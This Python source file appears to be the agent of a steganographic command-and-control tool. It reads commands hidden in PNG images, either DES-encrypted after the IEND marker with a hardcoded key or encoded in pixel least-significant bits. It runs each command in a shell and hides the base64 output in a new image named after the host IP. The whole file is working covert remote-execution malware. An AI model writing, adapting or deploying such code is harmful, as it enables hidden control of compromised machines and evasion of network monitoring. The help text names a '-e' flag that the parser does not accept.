import os,sys
from Crypto.Cipher import DES
import base64
import requests,socket
import re
import struct,zlib
import subprocess
from PIL import Image
from getopt import getopt

#Imgur API download image (TBA)
#------------------------
#Output return ke kucinglucu.png current directory

aic = False
lsb = False


def get_pixel_pairs(iterable):
	a = iter(iterable)
	return zip(a,a)

def get_LSB(value):
	if value & 1 == 0:
		return '0'
	else:
		return '1'

def extract(carrier):
	cim = Image.open(carrier)
	pixlist = list(cim.getdata())
	message = ""

	for pix1,pix2 in get_pixel_pairs(pixlist):
		mbyte ="0b"
		for p in pix1:
			mbyte += get_LSB(p)

		for p in pix2:
			mbyte += get_LSB(p)

		if mbyte == "0b00000000":
			break

		message += chr(int(mbyte,2))
	return message


def imageCreation():
	w, h = 500, 500
	placeholder = Image.new(mode="RGB", size =(w,h) )
	placeholder.save("rsp.png","PNG")
	return open("rsp.png","rb").read()

def DEScrypt(enccommand):
	key = bytes.fromhex("1337371342694209")
	dec = DES.new(key, DES.MODE_ECB)
	command = dec.decrypt(enccommand)
	return command.split(b"~")[0]


def decrypting(iloc,mode):
	bf = imageCreation()
	with open(iloc, 'rb') as x:
		f = x.read()

	#flags AIC Injection set True
	if mode == "aic":
		PNG_EOF = b"IEND\xaeB`\x82"
		length_eof = len(PNG_EOF)
		op_offset = re.search(PNG_EOF,f).start()
		enccommand = f[(op_offset+length_eof):]
		
		dec = DEScrypt(enccommand)
		executor = subprocess.Popen(dec.decode(),stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
		out, err = executor.communicate()
		ip_addr = socket.gethostbyname(socket.gethostname())
		print("Decrypted = "+out.decode())
		newbuffer = base64.b64encode(out)
		with open(ip_addr+'_aic.png','wb') as n:
			n.write(bf + newbuffer)
			n.close()
		print("Writing new image to "+ip_addr+"_aic.png success! The command has been encoded to base64")

	#flags LSB set True
	elif mode == "lsb":
		decrypted_LSB_command = extract('kucinglucu_lsb.png')
		executor = subprocess.Popen(decrypted_LSB_command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
		out, err = executor.communicate()
		ip_addr = socket.gethostbyname(socket.gethostname())
		print("Decrypted = "+out.decode())
		newbuffer = base64.b64encode(out)
		with open(ip_addr + '_lsb.png','wb') as x:
			x.write(bf + newbuffer)
			x.close()
		print("Writing new image to "+ip_addr+"_lsb.png success! The command has been encoded to base64")

def help():
	print("Usage: python "+sys.argv[0]+" -i <your image location> -e <mode [aic/lsb]>")
	print("i.e:")
	print("python "+sys.argv[0]+" -i pak_faisal.png -e aic")
	exit()

print("Welcome to aseng agent.py beta mode")
opts, _ = getopt(sys.argv[1:],"i:m:h",["image=","mode=","help"])
iloc = ""
mode = ""

if len(sys.argv) < 3:
	help()
for key, value in opts:
	if key in ("-i","--image"):
		iloc = value
	elif key in ("-m","--mode"):
		mode = value
	elif key in ("-h","--help"):
		help()
	else:
		help()

decrypting(iloc,mode)